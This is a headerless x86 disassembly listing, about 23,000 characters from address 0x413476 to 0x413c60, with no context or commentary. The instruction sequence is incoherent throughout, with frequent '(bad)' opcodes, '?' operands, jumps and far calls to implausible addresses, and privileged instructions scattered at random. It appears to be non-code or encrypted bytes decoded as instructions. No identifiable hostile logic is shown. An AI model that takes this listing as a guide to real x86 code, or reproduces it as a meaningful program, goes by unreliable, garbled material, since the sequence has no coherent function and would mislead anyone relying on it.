  413476:	cmp    ecx,DWORD PTR ds:0x188479f1
  41347c:	cmp    BYTE PTR [eax],0x43
  41347f:	push   es
  413480:	pop    ebp
  413481:	or     BYTE PTR [ecx-0x6d],cl
  413484:	cld    
  413485:	hlt    
  413486:	fcomi  st,st(0)
  413488:	daa    
  413489:	push   ds
  41348a:	fs loope 0x413468
  41348d:	ja     0x4134d3
  41348f:	stos   BYTE PTR es:[edi],al
  413490:	popa   
  413491:	(bad)  
  413492:	and    al,0x8e
  413494:	pusha  
  413495:	inc    esi
  413496:	bound  ebp,QWORD PTR ds:0xd90b4698
  41349c:	rol    bh,cl
  41349e:	addr16 jl 0x413462
  4134a1:	sub    DWORD PTR [ebx-0x12],ebp
  4134a4:	mov    ch,0x14
  4134a6:	mov    esp,0x85fa8756
  4134ab:	push   ecx
  4134ac:	js     0x41349b
  4134ae:	jge    0x4134e4
  4134b0:	sar    BYTE PTR [edi+ecx*4-0x6f],1
  4134b4:	cs ds icebp 
  4134b7:	je     0x41351c
  4134b9:	adc    BYTE PTR [edi-0xc],bl
  4134bc:	mov    ebp,0xad51bd11
  4134c1:	jne    0x4134f2
  4134c3:	mov    ch,0x14
  4134c5:	or     al,0x67
  4134c7:	in     eax,dx
  4134c8:	ror    bh,cl
  4134ca:	fidivr WORD PTR [esi+0x7b]
  4134cd:	mov    ecx,0x1d828b7a
  4134d2:	mov    eax,ds:0x5d1fc8df
  4134d7:	push   cs
  4134d8:	fsubr  QWORD PTR [esp+edi*1-0x596f2d36]
  4134df:	fadd   DWORD PTR [eax+0x4b411ca0]
  4134e5:	sbb    eax,0x60a1557
  4134ea:	sbb    bl,dh
  4134ec:	aam    0xbf
  4134ee:	xchg   ebp,eax
  4134ef:	test   al,0xd2
  4134f1:	lds    eax,FWORD PTR [esi-0x50]
  4134f4:	xor    al,0xe2
  4134f6:	test   al,0x14
  4134f8:	or     edx,DWORD PTR [ecx]
  4134fa:	cli    
  4134fb:	add    ch,BYTE PTR [esi+0x30]
  4134fe:	repz bound edx,QWORD PTR [edx+0x25]
  413502:	sar    ch,cl
  413504:	shl    BYTE PTR [eax],cl
  413506:	cs adc al,0xc6
  413509:	sub    al,0xf0
  41350b:	or     BYTE PTR [edi],bh
  41350d:	jecxz  0x413536
  41350f:	(bad)  
  413510:	call   0x3954:0x22c99574
  413517:	mov    ecx,0xcb5316d2
  41351c:	ins    BYTE PTR es:[edi],dx
  41351d:	call   FWORD PTR [ecx-0x7a3feb4b]
  413523:	(bad)  
  413524:	iret   
  413525:	adc    ebx,DWORD PTR gs:[ecx+0x32f011fd]
  41352c:	dec    esp
  41352d:	fstp   QWORD PTR [edi-0x7ae603f0]
  413533:	dec    ebx
  413534:	pop    ds
  413535:	mov    ecx,0x97bed1cf
  41353a:	sbb    BYTE PTR [esi+0x3deefda6],cl
  413540:	pop    es
  413541:	out    0xf6,al
  413543:	popf   
  413544:	shr    BYTE PTR [ecx+0x20],cl
  413547:	mov    ds:0xe3b25f6a,eax
  41354c:	mov    edi,0x30648c11
  413551:	sub    cl,BYTE PTR [ecx+0x7]
  413554:	stos   DWORD PTR es:[edi],eax
  413555:	pop    esp
  413556:	test   BYTE PTR [ebx-0xe],ah
  413559:	mov    dh,0xe8
  41355b:	mov    dl,0xfb
  41355d:	lahf   
  41355e:	enter  0xf18e,0x20
  413562:	mov    esp,0xad424386
  413567:	xor    edx,edx
  413569:	mov    edx,0xb704c9da
  41356e:	jnp    0x4135e7
  413570:	addr16 and ecx,edx
  413573:	mov    edi,0x6bf44fd2
  413578:	ja     0x4135a4
  41357a:	or     eax,0x6ba4d297
  41357f:	sbb    eax,ebx
  413581:	mov    eax,0x11df5b51
  413586:	jnp    0x4135c7
  413588:	outs   dx,DWORD PTR ds:[esi]
  413589:	mov    ebp,0xe529f6b3
  41358e:	arpl   WORD PTR [ebp-0x2d],bp
  413591:	push   ebp
  413592:	ins    DWORD PTR es:[edi],dx
  413593:	nop
  413594:	xchg   ebp,eax
  413595:	add    esi,edi
  413597:	jecxz  0x4135cb
  413599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41359a:	adc    al,0x8e
  41359c:	ffreep st(2)
  41359e:	outs   dx,BYTE PTR ds:[esi]
  41359f:	jmp    0x4135d2
  4135a1:	inc    eax
  4135a2:	sub    ah,ch
  4135a4:	rol    ah,cl
  4135a6:	add    DWORD PTR [edi+edx*4+0x251d99e0],esp
  4135ad:	adc    DWORD PTR [ecx+0x6c],ecx
  4135b0:	mov    cl,0x33
  4135b2:	aam    0x84
  4135b4:	mov    al,ds:0xef88f675
  4135b9:	lahf   
  4135ba:	test   DWORD PTR [eax],edi
  4135bc:	popa   
  4135bd:	loopne 0x41353f
  4135bf:	push   esi
  4135c0:	cmp    dl,BYTE PTR [ecx]
  4135c2:	(bad)  
  4135c3:	(bad)  
  4135c7:	and    DWORD PTR [eax+0x70],eax
  4135ca:	mov    ebx,DWORD PTR [edx-0x6cb4ca58]
  4135d0:	out    0x9,al
  4135d2:	test   eax,0x4f1e480f
  4135d7:	lock pop edx
  4135d9:	int3   
  4135da:	out    0xf6,eax
  4135dc:	mov    ch,0xfe
  4135de:	test   esp,esp
  4135e0:	hlt    
  4135e1:	mov    dh,0x1
  4135e3:	mov    bl,0xf
  4135e5:	js     0x41360a
  4135e7:	xchg   ebx,eax
  4135e8:	mov    al,ds:0x4051064d
  4135ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ee:	or     eax,0xf7fef794
  4135f3:	(bad)  
  4135f4:	mov    ?,WORD PTR [esi-0x7c]
  4135f7:	push   esi
  4135f8:	fdiv   DWORD PTR [edi-0x44b930d]
  4135fe:	jge    0x413593
  413600:	imul   edi,DWORD PTR [edi-0x7f],0xffffffc0
  413604:	js     0x413618
  413606:	jge    0x4135de
  413608:	sbb    esp,DWORD PTR [ebp+0x2fd03255]
  41360e:	push   ebx
  41360f:	fnstcw WORD PTR [ebx+0x7e]
  413612:	cmp    BYTE PTR [ebx-0x6bed5df1],al
  413618:	and    eax,0x5e22ff90
  41361d:	add    ebx,DWORD PTR [edi+0x3b2aa80e]
  413623:	mov    ah,0x48
  413625:	pop    esp
  413626:	out    dx,al
  413627:	jle    0x4135ab
  413629:	pop    eax
  41362a:	test   BYTE PTR [edx-0x3c8b39fe],ch
  413630:	add    edx,DWORD PTR [esi+edx*8]
  413633:	xchg   ebp,eax
  413634:	das    
  413635:	std    
  413636:	test   DWORD PTR [eax],ebx
  413638:	(bad)  
  41363a:	mov    ch,0xb4
  41363c:	shl    DWORD PTR [eax-0x5c],cl
  41363f:	sub    DWORD PTR [ecx-0x45],ecx
  413642:	jnp    0x4135f3
  413644:	add    BYTE PTR [ebx-0x3e],0x8d
  413648:	or     BYTE PTR [edi-0x2759f6a4],dh
  41364e:	mov    ah,0x5e
  413650:	push   esp
  413651:	pop    ds
  413652:	test   ecx,edx
  413654:	push   ebp
  413655:	pop    edx
  413656:	dec    ecx
  413657:	(bad)  
  413658:	cld    
  413659:	int    0xa
  41365b:	mov    ss,WORD PTR [ebx-0xbb1eac7]
  413661:	xchg   bl,ch
  413663:	and    eax,0x86fd15ad
  413668:	mov    ds:0x428d7bd2,eax
  41366d:	inc    edx
  41366e:	pop    eax
  41366f:	mov    ch,0x87
  413671:	mov    ebp,0x51bdadf
  413676:	(bad)
  41367a:	jp     0x413617
  41367c:	lahf   
  41367d:	jp     0x4136c0
  41367f:	outs   dx,DWORD PTR ds:[esi]
  413680:	add    bl,BYTE PTR [esp+eax*1]
  413683:	into   
  413684:	aaa    
  413685:	mov    edx,0x32d9dd32
  41368a:	jae    0x413658
  41368c:	(bad)  
  41368d:	arpl   WORD PTR [esi+0x7a17b8e3],bp
  413693:	mov    ?,WORD PTR [eax+ebp*4-0x18927d0]
  41369a:	mov    eax,0x5594d282
  41369f:	and    edx,DWORD PTR [ecx]
  4136a1:	or     al,0x47
  4136a3:	push   edx
  4136a4:	jne    0x413695
  4136a6:	jmp    0x769e5139
  4136ab:	sti    
  4136ac:	scas   eax,DWORD PTR es:[edi]
  4136ad:	out    0x5,eax
  4136af:	outs   dx,DWORD PTR ds:[esi]
  4136b0:	shl    BYTE PTR [eax],cl
  4136b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b3:	repnz (bad) 
  4136b5:	ins    BYTE PTR es:[edi],dx
  4136b6:	clc    
  4136b7:	fmulp  st(3),st
  4136b9:	and    eax,0x2bd2996c
  4136be:	std    
  4136bf:	fst    QWORD PTR [edi-0x2d18c49d]
  4136c5:	stos   DWORD PTR es:[edi],eax
  4136c6:	ja     0x413648
  4136c8:	and    edi,DWORD PTR [edi+0x1e5c5098]
  4136ce:	push   eax
  4136cf:	js     0x413708
  4136d1:	rol    DWORD PTR [eax-0x59],cl
  4136d4:	(bad)  
  4136d5:	cmp    DWORD PTR [edi+0x6e],ebx
  4136d8:	shl    DWORD PTR [edi+0x75],cl
  4136db:	xchg   esp,eax
  4136dc:	sbb    bl,al
  4136de:	push   ecx
  4136df:	sbb    DWORD PTR [esi-0x657128e0],0x1c
  4136e6:	add    DWORD PTR ds:0x74c5e76e,edx
  4136ec:	aam    0x50
  4136ee:	add    al,0xe8
  4136f0:	ins    BYTE PTR es:[edi],dx
  4136f1:	cdq    
  4136f2:	mov    WORD PTR [edi],ss
  4136f4:	mov    al,0x2b
  4136f6:	mov    eax,ds:0x35bee947
  4136fb:	ffreep st(5)
  4136fd:	leave  
  4136fe:	cmp    edx,DWORD PTR [esi+0x175a9eb5]
  413704:	jno    0x796d62cc
  41370a:	test   cl,bl
  41370c:	pop    edi
  41370d:	jbe    0x413777
  41370f:	int    0xda
  413711:	push   0xffffffb5
  413713:	mov    ss,WORD PTR [edx]
  413715:	jecxz  0x41370e
  413717:	daa    
  413718:	or     eax,0xd2ffa783
  41371d:	loope  0x413795
  41371f:	push   ecx
  413720:	push   edi
  413721:	or     DWORD PTR [edx+0x4b],esp
  413724:	out    0x11,eax
  413726:	daa    
  413727:	xor    bl,ch
  413729:	les    edx,FWORD PTR [ecx-0x5f]
  41372c:	or     esi,DWORD PTR [eax]
  41372e:	test   edi,ebx
  413730:	jle    0x413790
  413732:	sub    al,bh
  413734:	outs   dx,DWORD PTR ds:[esi]
  413735:	int3   
  413736:	repz xchg edi,eax
  413738:	nop
  413739:	jmp    0x4136da
  41373b:	xsave  [ecx+0x4c3de542]
  413742:	test   dl,bh
  413744:	pop    esi
  413745:	xor    BYTE PTR cs:[ecx-0x7308a232],al
  41374c:	fcomp  QWORD PTR [ecx-0x6dc5ecb4]
  413752:	in     eax,0x2d
  413754:	mov    ch,0x29
  413756:	test   DWORD PTR [eax+0x7dbd704b],eax
  41375c:	pop    ss
  41375d:	mov    esi,0xf5398d34
  413762:	das    
  413763:	xlat   BYTE PTR ds:[ebx]
  413764:	dec    edi
  413765:	pop    ebx
  413766:	push   edx
  413767:	pop    ebp
  413768:	lods   eax,DWORD PTR ds:[esi]
  413769:	or     al,0xd5
  41376b:	xchg   ebp,eax
  41376c:	jmp    0x4136f4
  41376e:	(bad)  
  41376f:	in     eax,dx
  413770:	inc    edx
  413771:	int3   
  413772:	mov    ds:0x297dc1ce,eax
  413777:	jmp    0xbf43fb4e
  41377c:	jns    0x4137c8
  41377e:	mov    ecx,0xef11ddc4
  413783:	(bad)  
  413784:	retf   0xf71e
  413787:	and    al,0x59
  413789:	scas   eax,DWORD PTR es:[edi]
  41378a:	int3   
  41378b:	popa   
  41378c:	ror    BYTE PTR [eax+edi*1],cl
  41378f:	call   0xa92141a2
  413794:	gs push ds
  413796:	push   cs
  413797:	jbe    0x4137b0
  413799:	fst    st(7)
  41379b:	push   cs
  41379c:	je     0x4137c3
  41379e:	test   eax,ebp
  4137a0:	fdivr  QWORD PTR [esi]
  4137a2:	sub    dh,ah
  4137a4:	aas    
  4137a5:	das    
  4137a6:	xor    DWORD PTR [esi+ecx*8+0x5331c962],ecx
  4137ad:	mov    BYTE PTR [eax-0x7a02812a],0xc1
  4137b4:	inc    DWORD PTR [edi-0xeb5d724]
  4137ba:	bound  ecx,QWORD PTR [esi-0x635b747f]
  4137c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c1:	mov    DWORD PTR [ebx],esi
  4137c3:	loope  0x4137e9
  4137c5:	nop
  4137c6:	int    0x89
  4137c8:	test   eax,0xa0bfd893
  4137cd:	pop    es
  4137ce:	test   DWORD PTR [edx+eax*1-0x51074fcb],ecx
  4137d5:	adc    esi,edx
  4137d7:	mov    ah,0xb
  4137d9:	mov    ah,al
  4137db:	sar    DWORD PTR [ebp-0x66],0x85
  4137df:	pushw  ss
  4137e1:	adc    ax,0x2314
  4137e5:	xor    dl,BYTE PTR [ebp-0x78]
  4137e8:	mov    dh,0xf3
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	adc    eax,0xa605b0bc
  4137f0:	push   esi
  4137f1:	cld    
  4137f2:	pop    eax
  4137f3:	push   0x26024c6
  4137f8:	push   edx
  4137f9:	test   DWORD PTR [edi+eax*8-0x1c],edx
  4137fd:	mov    esi,DWORD PTR [ebx+0x70110a62]
  413803:	fisttp WORD PTR [eax-0x27208ff]
  413809:	sar    BYTE PTR ss:[ebx-0x33b2b52e],cl
  413810:	sub    eax,ecx
  413812:	mov    eax,ds:0xd1e6e39
  413817:	test   BYTE PTR [ebx],cl
  413819:	(bad)  
  41381b:	bound  edi,QWORD PTR [eax]
  41381d:	cmc    
  41381e:	mov    dl,BYTE PTR [edi]
  413820:	not    DWORD PTR ds:0xeb75caf5
  413826:	dec    ecx
  413827:	cdq    
  413828:	xor    edx,DWORD PTR [ecx+eax*8]
  41382b:	and    al,0xf2
  41382d:	mov    ds:0x4ff2fb7c,eax
  413832:	dec    edx
  413833:	mov    bh,0xfd
  413835:	cli    
  413836:	cld    
  413837:	pop    ecx
  413838:	test   BYTE PTR [esi],ch
  41383a:	repz dec esi
  41383c:	add    eax,0x1c06978f
  413841:	adc    DWORD PTR [ebp+0x4e60eebc],esi
  413847:	test   DWORD PTR [eax+ebp*8],ebp
  41384a:	into   
  41384b:	ret    
  41384c:	sar    BYTE PTR [eax],cl
  41384e:	fisub  WORD PTR [edi+0x55]
  413851:	jge    0x41383d
  413853:	lds    eax,FWORD PTR [esp+eax*1+0x62]
  413857:	xchg   ebp,eax
  413858:	rcl    bh,0x21
  41385b:	btr    DWORD PTR [ebx-0x2d],ecx
  41385f:	enter  0x69e0,0x79
  413863:	leave  
  413864:	ror    BYTE PTR [edi+0x4],cl
  413867:	data16 sbb BYTE PTR [ecx-0x4c],bh
  41386b:	and    dl,BYTE PTR [ecx+0x70]
  41386e:	xchg   ecx,eax
  41386f:	xchg   edx,eax
  413870:	mov    al,ds:0x5b9125e8
  413875:	pop    esi
  413876:	mov    BYTE PTR [edi-0x2b7b8e50],ch
  41387c:	pop    ds
  41387d:	mov    ah,BYTE PTR [eax-0x31]
  413880:	inc    esi
  413881:	add    ecx,esp
  413883:	mov    cs,WORD PTR [esi-0x81086a5]
  413889:	rcr    al,cl
  41388b:	pop    es
  41388c:	rcl    al,cl
  41388e:	(bad)  
  41388f:	(bad)  [ecx+0x2080ef53]
  413895:	adc    DWORD PTR [esi],edx
  413897:	mov    edx,0xa94af802
  41389c:	daa    
  41389d:	inc    edx
  41389e:	test   BYTE PTR [ebp-0x4f5847f],ah
  4138a4:	jle    0x4138f7
  4138a6:	xchg   esp,eax
  4138a7:	call   0x18af4a70
  4138ac:	pop    ss
  4138ad:	retf   0xf1a9
  4138b0:	pop    ecx
  4138b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b2:	xor    BYTE PTR [ecx+0x66d6a871],0x66
  4138b9:	adc    ebp,esi
  4138bb:	nop
  4138bc:	loopne 0x4138a3
  4138be:	jb     0x413879
  4138c0:	jp     0x41390b
  4138c2:	inc    ecx
  4138c3:	lods   eax,DWORD PTR ds:[esi]
  4138c4:	sar    BYTE PTR ds:0x39b6cb78,cl
  4138ca:	fist   DWORD PTR [edi]
  4138cc:	enter  0x5411,0xe9
  4138d0:	int3   
  4138d1:	ss or  eax,0x984909be
  4138d7:	inc    edx
  4138d8:	add    eax,0xd200a5b9
  4138dd:	loopne 0x413942
  4138df:	push   esp
  4138e0:	jae    0x41389c
  4138e2:	stos   DWORD PTR es:[edi],eax
  4138e3:	push   ss
  4138e4:	retf   0x2910
  4138e7:	sub    dh,bl
  4138e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138ea:	mov    esp,0x8555ad39
  4138ef:	aam    0xbb
  4138f1:	add    edx,DWORD PTR [edi]
  4138f3:	(bad)  
  4138f4:	inc    ecx
  4138f5:	out    dx,al
  4138f6:	sar    esi,0x54
  4138f9:	push   ds
  4138fa:	add    BYTE PTR [edi],bh
  4138fc:	jle    0x413884
  4138fe:	mov    edi,0x8af15db9
  413903:	jl     0x4138bf
  413905:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413907:	aaa    
  413908:	sahf   
  413909:	inc    eax
  41390a:	pop    eax
  41390b:	test   DWORD PTR [eax-0x1a],edx
  41390e:	inc    ebp
  41390f:	mov    ss,WORD PTR ds:0x7ca49bd
  413915:	int3   
  413916:	retf   
  413917:	cmc    
  413918:	shl    BYTE PTR [edx-0x64],cl
  41391b:	call   0x1121:0xcb645b73
  413922:	add    al,0x5f
  413924:	jne    0x413991
  413926:	xor    DWORD PTR [edi+0x748478c6],esp
  41392c:	push   ds
  41392d:	mov    ebx,0x7fb5dbe6
  413932:	xor    ecx,DWORD PTR [ebp-0x64d17771]
  413938:	and    eax,0xd272ad8d
  41393d:	popa   
  41393e:	leave  
  41393f:	(bad)  
  413940:	std    
  413941:	inc    BYTE PTR [ebp+0x4f]
  413944:	push   ecx
  413945:	push   ds
  413946:	cmp    DWORD PTR [ecx],0xc89a1174
  41394c:	jnp    0x413982
  41394e:	test   DWORD PTR [edx-0x3e72416c],eax
  413954:	pop    edi
  413955:	je     0x41392f
  413957:	mov    esp,esi
  413959:	icebp  
  41395a:	clc    
  41395b:	dec    esi
  41395c:	dec    edx
  41395d:	les    ebx,FWORD PTR [edx-0x775f2084]
  413963:	in     eax,dx
  413964:	cmp    al,0xcc
  413966:	sbb    edi,DWORD PTR [edi+0x5c]
  413969:	outs   dx,BYTE PTR ds:[esi]
  41396a:	mov    ds:0xe311e9ae,eax
  41396f:	fucom  st(3)
  413971:	mov    dl,0xf0
  413973:	mov    WORD PTR [esi-0xa],fs
  413976:	test   DWORD PTR [edx],ecx
  413978:	stos   DWORD PTR es:[edi],eax
  413979:	test   BYTE PTR [eax],dh
  41397b:	fnstcw WORD PTR [ebp+edi*8+0x53]
  41397f:	lea    esp,[eax]
  413981:	call   0x9c2690fa
  413986:	sub    ebp,DWORD PTR [esi-0x577a531f]
  41398c:	mov    edx,0xc46b2fa4
  413991:	push   ebp
  413992:	cmp    DWORD PTR [ebp-0x1fe1f0d4],ecx
  413998:	push   ebx
  413999:	fist   DWORD PTR [eax+0x5b2fd2fe]
  41399f:	mov    cl,BYTE PTR [ebp-0x6d]
  4139a2:	call   0xed5254ab
  4139a7:	cmp    dh,BYTE PTR [ecx]
  4139a9:	test   al,0x87
  4139ab:	aaa    
  4139ac:	cmp    al,0xf8
  4139ae:	test   DWORD PTR [ebx],ebp
  4139b0:	sbb    al,0x58
  4139b2:	int    0x91
  4139b4:	mov    esi,0xe78ecad0
  4139b9:	dec    esi
  4139ba:	xchg   ebx,eax
  4139bb:	adc    BYTE PTR [edi],dl
  4139bd:	push   ecx
  4139be:	add    al,BYTE PTR [edx]
  4139c0:	shr    bh,cl
  4139c2:	pop    ds
  4139c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139c4:	int3   
  4139c5:	add    al,0xb2
  4139c7:	inc    esi
  4139c9:	cmp    BYTE PTR [esi+0x3e],bl
  4139cc:	shl    bh,cl
  4139ce:	mov    cl,0xfc
  4139d0:	and    DWORD PTR [ecx+esi*2],0x4c
  4139d4:	test   eax,0xf9a5faee
  4139d9:	xchg   esi,eax
  4139da:	fisub  DWORD PTR fs:[edx]
  4139dd:	sbb    BYTE PTR [ebx+0x79],0xf3
  4139e1:	adc    edi,ebp
  4139e3:	cld    
  4139e4:	add    edi,DWORD PTR [eax]
  4139e6:	imul   BYTE PTR [ebx+esi*4]
  4139e9:	retf   
  4139ea:	test   DWORD PTR [ecx+ebx*4],ebx
  4139ed:	sub    ecx,esp
  4139ef:	loop   0x4139b7
  4139f1:	inc    ecx
  4139f2:	ins    DWORD PTR es:[edi],dx
  4139f3:	mov    cs,WORD PTR [esi+0x44a9d091]
  4139f9:	fcmovu st,st(3)
  4139fb:	scas   al,BYTE PTR es:[edi]
  4139fc:	shl    BYTE PTR [eax+eiz*8-0x8e9365a],cl
  413a03:	jae    0x413a36
  413a05:	adc    DWORD PTR [edi-0x44b95e],ecx
  413a0b:	mov    eax,0xdffc2a3e
  413a10:	dec    ecx
  413a11:	sar    BYTE PTR [ecx],1
  413a13:	ins    DWORD PTR es:[edi],dx
  413a14:	ins    BYTE PTR es:[edi],dx
  413a15:	add    al,0x62
  413a17:	scas   al,BYTE PTR es:[edi]
  413a18:	xor    eax,0x4a65e41c
  413a1d:	inc    ebx
  413a1e:	rcr    DWORD PTR [esi-0xc],cl
  413a21:	pop    ebp
  413a22:	inc    ebx
  413a23:	adc    ebx,esp
  413a25:	enter  0xfb79,0xd2
  413a29:	(bad)  
  413a2a:	mov    esp,0x957b66d1
  413a2f:	pop    ebp
  413a30:	jge    0x413a6b
  413a32:	sahf   
  413a33:	and    dl,dl
  413a35:	or     edi,DWORD PTR [ecx]
  413a37:	mov    edi,0x2bb2a332
  413a3c:	shl    BYTE PTR [esi-0x44],cl
  413a3f:	xchg   esp,eax
  413a40:	test   eax,0xb30f1762
  413a45:	adc    DWORD PTR [eax-0x80],ebx
  413a48:	sub    DWORD PTR [esp+ebp*2+0x50],edi
  413a4c:	(bad)  
  413a4e:	test   edi,ebp
  413a50:	xor    al,dl
  413a52:	inc    ebp
  413a53:	aas    
  413a54:	xchg   esi,eax
  413a55:	mov    dh,0xd9
  413a57:	mov    es,WORD PTR ds:0xaa8ffaae
  413a5d:	jp     0x413a6e
  413a5f:	cmp    al,0xd2
  413a61:	shl    BYTE PTR [edx-0xaf2e52c],cl
  413a67:	jnp    0x413adc
  413a69:	push   ds
  413a6a:	outs   dx,BYTE PTR ds:[esi]
  413a6b:	pop    esi
  413a6c:	sbb    DWORD PTR [ecx-0x1bcbe759],esi
  413a72:	mov    BYTE PTR [ebp+0x6],al
  413a75:	rol    BYTE PTR [esi],cl
  413a77:	mov    ch,0x1d
  413a79:	mov    eax,ds:0xf9f0a8a4
  413a7e:	adc    DWORD PTR [ebx-0x73f55c7a],0xffffffda
  413a85:	idiv   BYTE PTR [edx+0x2931f6f1]
  413a8b:	int3   
  413a8c:	shr    BYTE PTR [edi+0x11],cl
  413a8f:	push   edx
  413a90:	adc    ah,BYTE PTR [ebp+edi*4-0x3dee02ec]
  413a97:	fcmovu st,st(2)
  413a99:	push   edi
  413a9a:	add    al,0xd7
  413a9c:	je     0x413b0f
  413a9e:	test   dl,dh
  413aa0:	pop    ebp
  413aa1:	add    eax,0x33ada576
  413aa6:	shl    DWORD PTR [edi+ebx*4+0x2abc0535],1
  413aad:	data16 adc BYTE PTR [eax-0x4e],bl
  413ab1:	or     bh,BYTE PTR ds:0x6d113a34
  413ab7:	shr    BYTE PTR [edx-0x1c73e75],cl
  413abd:	loop   0x413a6a
  413abf:	popa   
  413ac0:	dec    edi
  413ac1:	push   ds
  413ac2:	sub    eax,0xcdeba393
  413ac7:	pop    ebp
  413ac8:	mov    ebp,DWORD PTR [edx]
  413aca:	mov    ebx,DWORD PTR [edx]
  413acc:	add    BYTE PTR [ebp-0x632fcc30],0x8
  413ad3:	push   edi
  413ad4:	xor    bl,bl
  413ad6:	fisttp DWORD PTR [edi-0x7171959e]
  413adc:	jecxz  0x413b09
  413ade:	inc    ebx
  413adf:	ret    
  413ae0:	or     dh,ch
  413ae2:	push   esi
  413ae3:	push   cs
  413ae4:	imul   eax,DWORD PTR [edx+0x41],0xd9de82bf
  413aeb:	mov    bh,bl
  413aed:	es push ecx
  413aef:	and    DWORD PTR [ebp-0x60668115],ebp
  413af5:	lea    esi,[ebp-0x7a10db22]
  413afb:	mov    esi,0x9c02dd32
  413b00:	sub    edx,DWORD PTR [edi]
  413b02:	lods   eax,DWORD PTR ds:[esi]
  413b03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b04:	adc    bh,BYTE PTR [edx+0x4]
  413b07:	stos   BYTE PTR es:[edi],al
  413b08:	leave  
  413b09:	jns    0x413b52
  413b0b:	add    al,BYTE PTR [eax+0x55528524]
  413b11:	mov    ah,0x50
  413b13:	lahf   
  413b14:	maskmovq mm0,(bad)
  413b15:	test   DWORD PTR [ecx],0x80a31d8e
  413b1b:	fs inc eax
  413b1d:	adc    edi,DWORD PTR [ebx-0x2dcf2d01]
  413b23:	shr    ecx,0x5b
  413b26:	lock push ecx
  413b28:	adc    DWORD PTR fs:[esi],edi
  413b2b:	lods   eax,DWORD PTR ds:[esi]
  413b2c:	jne    0x413b4f
  413b2e:	xor    eax,0x5852cbe
  413b33:	(bad)  
  413b34:	ret    
  413b35:	outs   dx,DWORD PTR ds:[esi]
  413b36:	mov    al,0x38
  413b38:	rcl    ch,cl
  413b3a:	aam    0x2f
  413b3c:	loope  0x413ad4
  413b3e:	and    ah,BYTE PTR [ebp+0x33]
  413b41:	jg     0x413acd
  413b43:	mov    gs,WORD PTR [edi]
  413b45:	add    al,0x17
  413b47:	stc    
  413b48:	adc    DWORD PTR [ebx],esi
  413b4a:	cli    
  413b4b:	or     al,0xad
  413b4d:	(bad)  
  413b4f:	out    dx,eax
  413b50:	xchg   BYTE PTR [edx-0x17f629f0],al
  413b56:	in     al,dx
  413b57:	mov    es,WORD PTR [ebp-0x32]
  413b5a:	xchg   esp,eax
  413b5b:	mov    eax,ds:0x6ae825f0
  413b60:	sar    BYTE PTR [edi+eiz*1-0x41fc4883],cl
  413b67:	mov    ebp,0x43721138
  413b6c:	xchg   DWORD PTR [ecx],esp
  413b6e:	xor    bl,0x64
  413b71:	xor    DWORD PTR [ebp+0x5ab15d3b],eax
  413b77:	(bad)  
  413b78:	adc    eax,0xb58ed193
  413b7d:	xchg   esi,eax
  413b7e:	mov    edx,0xde6aac6c
  413b83:	in     al,0x8c
  413b85:	aas    
  413b86:	test   edx,ebp
  413b88:	dec    ebp
  413b89:	retf   0x5b40
  413b8c:	sahf   
  413b8d:	(bad)
  413b91:	aad    0x13
  413b93:	sti    
  413b94:	and    DWORD PTR [ecx],edx
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	add    eax,esp
  413b99:	jge    0x413bc2
  413b9b:	stos   DWORD PTR es:[edi],eax
  413b9c:	test   BYTE PTR [ecx],0xa0
  413b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ba0:	push   ss
  413ba1:	add    eax,0xe56cfe85
  413ba6:	xchg   ebx,eax
  413ba7:	imul   edi,ebx,0x22
  413baa:	ret    
  413bab:	push   ecx
  413bac:	rcl    BYTE PTR [esi-0x4fe6145d],cl
  413bb2:	cmp    esp,esi
  413bb4:	mov    al,0x56
  413bb6:	test   BYTE PTR [ecx],dl
  413bb8:	jle    0x413b7b
  413bba:	ror    DWORD PTR [edi-0x71771a26],1
  413bc0:	or     al,0x3f
  413bc2:	and    cl,BYTE PTR [ecx-0x438dacc4]
  413bc8:	shl    dl,cl
  413bca:	cmc    
  413bcb:	cmp    cl,BYTE PTR [edi+0x5d]
  413bce:	sbb    BYTE PTR [ecx-0x254ce2a0],0xb4
  413bd5:	adc    ecx,DWORD PTR [edx+0x553d3fd3]
  413bdb:	sbb    BYTE PTR [edx-0x68de7ef1],ah
  413be1:	retf   0x820c
  413be4:	mov    eax,ds:0x8a86c650
  413be9:	push   esi
  413bea:	mov    edi,0x85b72487
  413bef:	shl    DWORD PTR [ebp-0x640e290],1
  413bf5:	mov    ds:0xe60d8e69,eax
  413bfa:	stc    
  413bfb:	jnp    0x413c25
  413bfd:	int3   
  413bfe:	xchg   esi,eax
  413bff:	aaa    
  413c00:	daa    
  413c01:	xor    eax,0xb4c86985
  413c06:	test   eax,0xdc4cc039
  413c0b:	(bad)  
  413c0c:	std    
  413c0d:	test   al,0x38
  413c0f:	mov    ss,WORD PTR [ecx+edi*1+0x5]
  413c13:	jns    0x413c13
  413c15:	mov    edi,0xcc6be881
  413c1a:	xchg   dh,dh
  413c1c:	pop    ecx
  413c1d:	xor    ecx,0xffffff93
  413c20:	shl    BYTE PTR [esi-0x1ce6b0e8],cl
  413c26:	sbb    ecx,DWORD PTR [esi-0x56534efc]
  413c2c:	pusha  
  413c2d:	mov    ebp,0xf7a90c52
  413c32:	xchg   ah,al
  413c34:	dec    esp
  413c35:	dec    ebx
  413c36:	test   BYTE PTR [ebx+edx*4],dl
  413c39:	aas    
  413c3a:	rcl    BYTE PTR [edi+0x741cefa2],1
  413c40:	and    al,0x9c
  413c42:	cmp    ecx,edi
  413c44:	jb     0x413bc6
  413c46:	jge    0x413c66
  413c48:	out    0xab,eax
  413c4a:	test   DWORD PTR [ecx],edi
  413c4c:	xchg   esp,eax
  413c4d:	pop    ss
  413c4e:	int3   
  413c4f:	inc    esp
  413c50:	sbb    esi,DWORD PTR [esp+esi*2-0x72]
  413c54:	ret    0xcd8
  413c57:	mov    cl,0x68
  413c59:	lahf   
  413c5a:	mov    dl,BYTE PTR [esi-0x1a6ea32e]
  413c60:	test   eax,0x40916245
